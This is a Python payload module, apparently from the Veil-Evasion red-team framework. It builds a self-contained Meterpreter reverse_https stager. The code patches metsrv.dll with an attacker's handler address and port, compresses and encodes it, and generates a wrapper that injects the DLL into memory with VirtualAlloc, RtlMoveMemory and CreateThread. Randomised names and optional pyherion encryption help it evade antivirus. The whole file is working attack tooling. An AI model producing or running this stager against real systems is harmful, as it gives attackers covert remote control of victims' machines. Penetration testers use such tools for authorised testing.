"""

Reads in metsrv.dll, patches it with appropriate options for a 
meterpreter reverse_https payload compresses/bas64 encodes it 
and then builds a python injection wrapper to inject the contained 
meterpreter dll into memory.

Concept and module by @harmj0y

"""

import struct, string, random, sys, os

from modules.common import helpers
from modules.common import encryption
from modules.common import patch

import settings


class Payload:
    
    def __init__(self):
        # required options
        self.description = "self-contained windows/meterpreter/reverse_https stager, no shellcode"
        self.language = "python"
        self.rating = "Excellent"
        self.extension = "py"
        
        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
                                 "inject_method" : ["virtual", "[virtual]alloc or [void]pointer"],
                                 "LHOST" : ["", "IP of the metasploit handler"],
                                 "LPORT" : ["443", "Port of the metasploit handler"]}

                    
    def generate(self):
        
        # get the main meterpreter .dll with the header/loader patched
        meterpreterDll = patch.headerPatch()

        # turn on SSL
        meterpreterDll = patch.patchTransport(meterpreterDll, True)

        # replace the URL
        urlString = "https://" + self.required_options['LHOST'][0] + ":" + str(self.required_options['LPORT'][0]) + "/" + helpers.genHTTPChecksum() + "_" + helpers.randomString(16) + "/\x00"
        meterpreterDll = patch.patchURL(meterpreterDll, urlString)
        
        # replace in the UA
        meterpreterDll = patch.patchUA(meterpreterDll, "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\x00")

        # compress/base64 encode the dll
        compressedDll = helpers.deflate(meterpreterDll)
        
        # actually build out the payload
        payloadCode = ""
        
        # traditional void pointer injection
        if self.required_options["inject_method"][0].lower() == "void":

            # doing void * cast
            payloadCode += "from ctypes import *\nimport base64,zlib\n"

            randInflateFuncName = helpers.randomString()
            randb64stringName = helpers.randomString()
            randVarName = helpers.randomString()

            # deflate function
            payloadCode += "def "+randInflateFuncName+"("+randb64stringName+"):\n"
            payloadCode += "\t" + randVarName + " = base64.b64decode( "+randb64stringName+" )\n"
            payloadCode += "\treturn zlib.decompress( "+randVarName+" , -15)\n"

            randVarName = helpers.randomString()
            randFuncName = helpers.randomString()
            
            payloadCode += randVarName + " = " + randInflateFuncName + "(\"" + compressedDll + "\")\n"
            payloadCode += randFuncName + " = cast(" + randVarName + ", CFUNCTYPE(c_void_p))\n"
            payloadCode += randFuncName+"()\n"

        # VirtualAlloc() injection
        else:

            payloadCode += 'import ctypes,base64,zlib\n'

            randInflateFuncName = helpers.randomString()
            randb64stringName = helpers.randomString()
            randVarName = helpers.randomString()
            randPtr = helpers.randomString()
            randBuf = helpers.randomString()
            randHt = helpers.randomString()

            # deflate function
            payloadCode += "def "+randInflateFuncName+"("+randb64stringName+"):\n"
            payloadCode += "\t" + randVarName + " = base64.b64decode( "+randb64stringName+" )\n"
            payloadCode += "\treturn zlib.decompress( "+randVarName+" , -15)\n"

            payloadCode += randVarName + " = bytearray(" + randInflateFuncName + "(\"" + compressedDll + "\"))\n"
            payloadCode += randPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ randVarName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
            payloadCode += randBuf + ' = (ctypes.c_char * len(' + randVarName + ')).from_buffer(' + randVarName + ')\n'
            payloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + randPtr + '),' + randBuf + ',ctypes.c_int(len(' + randVarName + ')))\n'
            payloadCode += randHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + randPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
            payloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + randHt + '),ctypes.c_int(-1))\n'

        
        if self.required_options["use_pyherion"][0].lower() == "y":
            payloadCode = encryption.pyherion(payloadCode)

        return payloadCode
